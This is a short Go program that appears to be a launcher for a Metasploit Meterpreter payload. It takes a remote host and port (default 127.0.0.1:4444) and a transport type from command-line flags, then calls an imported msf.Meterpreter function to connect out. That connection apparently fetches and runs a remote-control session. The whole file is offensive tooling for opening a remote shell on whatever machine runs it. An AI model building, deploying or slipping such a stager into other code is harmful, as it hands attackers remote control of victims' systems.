package main

import (
	"github.com/bhagyashriw777/gosc/msf"
	flag "github.com/spf13/pflag"
)

var remote string
var method string = "https"

func ParseCommandLine() {
	flag.StringVarP(&remote, "remote", "r", "127.0.0.1:4444", "host and port to connect to")
	flag.StringVarP(&method, "method", "m", "https", "type of msf (http, https, tcp)")
	flag.Parse()
}

func main() {
	ParseCommandLine()
	msf.Meterpreter(method, remote)
}
